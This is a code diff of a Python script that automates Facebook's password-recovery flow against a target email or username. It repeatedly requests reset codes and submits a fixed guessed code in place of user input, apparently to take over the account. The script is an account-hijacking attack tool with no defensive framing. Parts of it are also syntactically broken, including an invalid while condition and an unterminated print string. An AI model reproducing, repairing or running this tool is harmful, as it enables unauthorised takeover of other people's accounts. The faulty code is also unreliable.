@@ -48,6 +48,7 @@ os.system('clear')
 soup = BeautifulSoup()
 email = input('Email address or username to attack:')
 redo = 0
+reset = 999999
 """password = input('Password:')"""
 while newpass = test:
   browser = mechanize.Browser()
@@ -68,11 +69,25 @@ while newpass = test:
   browser.select_form(nr=0)
   browser.submit()
   """reset code input"""
+  while soup.find(string="n") == test:
+    browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
+    browser.select_form(nr=0)
+    browser.form['email'] = email
+    browser.submit()
+    """selection confirmation"""
+    browser.select_form(nr=0)
+    browser.submit()
+    browser.select_form(nr=0)
+    browser.submit()
+    browser.select_form(nr=0)
+    browser.submit()
+    browser.select_form(nr=0)
+    print("/", end='\r')
+    print("\", end='\r')
   browser.select_form(nr=0)
-  reset = input('Code: ')
+  """reset = input('Code: ')"""
   browser.form['n'] = reset
   browser.submit()
-  reset = 999999
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   test = soup.find(string="poop")
